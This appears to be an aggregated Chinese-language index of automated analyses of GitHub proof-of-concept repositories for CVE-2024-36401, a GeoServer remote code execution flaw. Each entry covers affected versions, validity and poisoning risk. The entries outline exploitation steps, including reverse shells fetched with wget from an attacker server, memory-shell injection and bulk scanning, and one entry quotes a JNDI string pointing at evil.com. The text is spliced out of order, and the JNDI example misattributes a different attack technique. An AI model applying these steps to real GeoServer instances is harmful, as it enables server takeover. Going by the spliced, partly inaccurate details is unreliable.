查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
